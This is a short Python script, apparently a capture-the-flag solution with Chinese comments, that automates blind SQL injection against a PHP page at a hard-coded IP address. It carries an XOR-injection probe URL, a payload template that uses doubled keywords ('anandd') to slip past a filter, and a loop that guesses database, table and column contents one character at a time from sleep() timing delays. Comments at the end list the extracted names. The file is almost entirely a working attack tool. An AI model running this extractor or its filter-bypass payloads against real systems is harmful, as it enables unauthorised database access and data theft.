# coding:utf-8

'''
通过异或注入，得出过滤字符：
异或注入payload : http://123.206.87.240:9004/1ndex.php?id=1^(length('union')!=0)--+
union, select
'''

import requests

def guest_len():
    payload = input('input payload(length):\n')
    for i in range(1,100):
        try:
            requests.get(payload.format(str(i)), timeout=3)
        except requests.exceptions.ReadTimeout:
            print('len:', i)
            return


#http://123.206.87.240:9004/1ndex.php?id=1' anandd if((substring(select database(),{0},1))='{1}'), sleep(5), 0) anandd '1'='1
def guest_name(payload, index):
    
    s = '123456789abcdefghijklmnopqrstuvwxyz~!@#$%^&*()_+-='
    for ch in range(33,126):
        try:
            requests.get(payload.format(str(index), ch), timeout=3)
            #print(payload.format(str(index), ch))
        except requests.exceptions.ReadTimeout:
            return ch

method = input('select method:\n')
if(method == '1'):
    guest_len()
elif (method == '2'):
    payload = input('input payload:\n')
    for i in range(1,40):
        print(chr(guest_name(payload, i)), end='')
    
    
#database = web1002-1
#tb_name_len = len: 10
#tb_name = flag1,hint
#column_name_len = len: 13
#column_name = flag1,address    id,contents
#data_name_len = 20
